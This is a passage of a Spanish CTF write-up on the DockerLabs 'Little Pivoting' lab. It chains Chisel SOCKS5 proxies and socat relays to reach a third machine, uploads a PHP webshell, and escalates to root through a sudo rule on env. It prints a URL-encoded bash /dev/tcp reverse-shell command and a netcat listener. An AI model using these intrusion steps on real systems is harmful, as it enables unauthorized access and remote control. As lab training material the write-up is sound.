> `R:1081:socks` — Crea un segundo proxy SOCKS5 en el puerto `1081` del atacante — distinto del `1080` ya ocupado por el primer túnel.

Con el segundo proxy activo, actualizamos `proxychains.conf` añadiendo el segundo salto. El orden es crítico: el proxy más cercano primero (`1080` a través de M1), el más lejano después (`1081` a través de M2):

> [!tip] Actualizar proxychains.conf para el doble pivoting
> ```bash
> sudo nano /etc/proxychains.conf
> ```
```
dynamic_chain

[ProxyList]
socks5 127.0.0.1 1081
socks5 127.0.0.1 1080
```

Con esta configuración, cualquier comando con `proxychains` en Kali enrutará su tráfico de forma transparente a través de M1 y M2 hasta alcanzar la red `30.30.30.0/24` donde vive la Máquina 3.

---

# 🖥️ Máquina 3 — 30.30.30.3

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 30.30.30.3
> **💀 Dificultad:**
> **🌐 Plataforma:** DockerLabs
> **🔗 Acceso vía:** Pivot desde Máquina 1 → Máquina 2 mediante Chisel reverse SOCKS5 encadenado

## 🔍 Reconocimiento y Enumeración

> [!important] Esta máquina requiere **doble pivoting** — el tráfico atraviesa la Máquina 1 y la Máquina 2 antes de llegar al destino. Todos los comandos deben ejecutarse con `proxychains` y se recomienda reducir el `--min-rate` para compensar la latencia adicional de los dos saltos.

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

> [!tip] Escaneo de puertos a través del doble proxy SOCKS5
> ```bash
> proxychains nmap -sT -Pn -p- -n 30.30.30.3 --min-rate 2000 -vvv -oN ports_m3 2>/dev/null
> ```
> `proxychains` — Encadena el tráfico a través de `1080` (M1) y `1081` (M2) en serie hasta alcanzar `30.30.30.3`.
> `-sT` — TCP Connect Scan obligatorio con proxychains.
> `-Pn` — Sin ping ICMP.
> `--min-rate 2000` — Reducimos la tasa respecto a los escaneos anteriores — el doble pivoting añade latencia considerable que puede causar resultados incorrectos con tasas más altas.
> `-oN ports_m3` — Guarda el output en el archivo `ports_m3`.

![](assets/Little%20Pivoting-img-24-03-2026-2.png)

El escaneo revela el **puerto 80** (HTTP) abierto.

#### 🔬 Enumeración de versiones y servicios

> [!tip] Detección de versiones a través del doble proxy
> ```bash
> proxychains nmap -sT -sV -sC -Pn -p80 -n 30.30.30.3 -oN version_m3 2>/dev/null
> ```
> `-p80` — Puerto descubierto en el escaneo anterior.
> `-oN version_m3` — Guarda el output en el archivo `version_m3`.

![](assets/Little%20Pivoting-img-24-03-2026-3.png)

### 🌐 Enumeración Web — Puerto 80

Para visualizar el servicio web de la Máquina 3 desde el navegador de Kali necesitamos una cadena de redirectores socat de dos saltos — uno en cada pivot — que transporten el tráfico desde Kali hasta `30.30.30.3:80`:
```
Kali:8001 → socat M1:8001 → socat M2:8002 → 30.30.30.3:80
```

> [!tip] Crear cadena de redirectores socat para exponer el web de la Máquina 3
> ```bash
> # En la Máquina 1 — primer relay: recibe de Kali y reenvía a M2
> ./socat TCP-LISTEN:8001,fork,reuseaddr TCP:20.20.20.3:8002 &
>
> # En la Máquina 2 — segundo relay: recibe de M1 y reenvía a M3
> ./socat TCP-LISTEN:8002,fork,reuseaddr TCP:30.30.30.3:80 &
> ```
> `TCP-LISTEN:8001` en M1 — Escucha conexiones desde Kali en el puerto `8001` de `10.10.10.2`.
> `TCP:20.20.20.3:8002` — Reenvía a la Máquina 2 en el puerto `8002` donde el segundo socat estará escuchando.
> `TCP-LISTEN:8002` en M2 — Recibe el tráfico que llega de M1 y lo reenvía a la Máquina 3.
> `TCP:30.30.30.3:80` — Destino final: el servicio web de la Máquina 3.

Con ambos redirectores activos, accedemos desde el navegador de Kali a `http://10.10.10.2:8001` y el tráfico viaja transparentemente hasta `30.30.30.3:80`:

![](assets/Little%20Pivoting-img-24-03-2026-4.png)

El servicio web está accesible — visualizamos la web de la Máquina 3. Con visibilidad sobre la aplicación web podemos continuar con la enumeración y explotación.

## 💥 Explotación

### 🐚 Remote Code Execution via webshell PHP

Explorando la web encontramos un formulario de subida de archivos sin restricciones. Subimos una webshell PHP que utiliza la función `$_GET['cmd']` para ejecutar comandos del sistema operativo arbitrarios a través de la URL, lo que nos dará **Remote Code Execution (RCE)**:

![](assets/Little%20Pivoting-img-24-03-2026-5.png)

Accedemos a la ruta donde se subió el archivo y confirmamos la ejecución remota de comandos a través del parámetro `cmd` en la URL. Con RCE confirmado, el siguiente paso — y el más complejo en un escenario de triple pivoting — es obtener una reverse shell que llegue hasta nuestra máquina Kali.

Para que la reverse shell de la Máquina 3 llegue a Kali necesita recorrer el camino inverso a través de todos los pivots. Construimos una cadena de redirectores socat que transporta las conexiones desde `30.30.30.3` hasta Kali, pasando por M2 y M1:
```
30.30.30.3 → socat M2:4444 → socat M1:4444 → Kali:443
```

> [!tip] Crear cadena de redirectores socat para recibir la reverse shell en Kali
> ```bash
> # En la Máquina 2 — primer relay de vuelta: recibe la shell de M3 y reenvía a M1
> ./socat TCP-LISTEN:4444,fork,reuseaddr TCP:20.20.20.2:4444 &
>
> # En la Máquina 1 — segundo relay de vuelta: recibe de M2 y reenvía a Kali
> ./socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.10.10.1:443 &
>
> # En Kali — listener final que recibirá la shell
> nc -lvnp 443
> ```
> El flujo es: la Máquina 3 envía la reverse shell a `30.30.30.2:4444` (la IP de M2 en esa red). Socat en M2 la recibe y la reenvía a `20.20.20.2:4444` (la IP de M1 en esa red). Socat en M1 la recibe y la reenvía a `10.10.10.1:443` (la IP de Kali en la red del laboratorio). Netcat en Kali recibe la conexión final.

Con los listeners activos, ejecutamos la reverse shell desde la webshell apuntando a la IP de la Máquina 2 en la red `30.30.30.0/24`:
```
http://10.10.10.2:8001/uploads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/30.30.30.2/4444 0>%261"
```

`bash -i >%26 /dev/tcp/30.30.30.2/4444 0>%261` — Reverse shell bash que conecta de vuelta a `30.30.30.2:4444` (la IP de M2 vista desde M3). El `%26` y `%261` son la codificación URL de `&` y `&1` respectivamente — necesaria al pasar el comando por la URL.

![](assets/Little%20Pivoting-img-24-03-2026-6.png)

La reverse shell llega a Kali atravesando la cadena completa de pivots. Tenemos acceso a la Máquina 3.

## 🔼 Escalada de Privilegios

### ⚡ Escalada a root via sudo + env (GTFOBins)

Con acceso a la Máquina 3, ejecutamos `sudo -l` para verificar los permisos sudo del usuario actual:

> [!tip] Verificar permisos sudo en la Máquina 3
> ```bash
> sudo -l
> ```

El output revela que el usuario puede ejecutar `/usr/bin/env` como root sin contraseña (`NOPASSWD`). Consultamos GTFOBins y confirmamos el vector de escalada: `env` puede usarse para ejecutar comandos arbitrarios en el contexto del usuario especificado con sudo:

![](assets/Little%20Pivoting-img-24-03-2026-7.png)

> [!tip] Escalar a root abusando del permiso sudo sobre env
> ```bash
> sudo env /bin/bash
> ```
> `sudo env` — Ejecuta `env` en el contexto de root gracias al permiso sudo.
> `/bin/bash` — Argumento pasado a `env`: el comando a ejecutar. `env` ejecuta el comando en el entorno actual — como se ejecuta como root, la bash resultante es una shell de root.

![](assets/Little%20Pivoting-img-24-03-2026-8.png)

Somos **root** en la Máquina 3. El engagement de triple pivoting está completado.

---

## 📝 Lecciones Aprendidas

**LFI como vector de reconocimiento inicial.** La vulnerabilidad de Local File Inclusion en la Máquina 1 no solo dio acceso al sistema — proporcionó los usuarios válidos que fueron el punto de partida para el ataque de fuerza bruta SSH. En pentesting real, un LFI raramente se explota solo para leer `/etc/passwd` — es el primer paso para identificar usuarios, rutas de configuración y otros artefactos que catalizan el resto del ataque.

**sudo -l siempre es el primer comando.** En las tres máquinas la escalada a root fue inmediata tras ejecutar `sudo -l`. PHP, vim y env son binarios documentados en GTFOBins con métodos de explotación directa — en entornos CTF basados en Docker esta configuración es extremadamente frecuente y hay que comprobarla siempre antes de buscar vectores más complejos.

**socat como complemento indispensable de chisel.** El uso combinado de chisel (SOCKS5 para enrutamiento general con proxychains) y socat (redirectores específicos para servicios concretos) demostró ser la combinación más versátil del engagement. Chisel da acceso a redes enteras, socat expone servicios individuales de forma directa — especialmente crítico para aplicaciones como navegadores o hydra que no soportan proxychains, y para construir la cadena de reverse shell en el triple pivoting.

**El orden de los proxies en proxychains.conf es crítico.** En doble pivoting, un orden incorrecto en el `[ProxyList]` rompe completamente el encadenamiento. Los proxies deben listarse del más cercano al más lejano — el primer salto primero, el segundo salto después. Usar `dynamic_chain` es imprescindible para que proxychains gestione correctamente la cadena de múltiples saltos.

**La cadena de reverse shell en triple pivoting es el reto real.** Conseguir que una reverse shell atraviese múltiples redes segmentadas requiere planificar cuidadosamente la cadena de redirectores socat en cada pivot. El tráfico debe tener una ruta definida en cada salto — un redirector por pivot en cada dirección — y cualquier error en una IP o puerto rompe toda la cadena silenciosamente.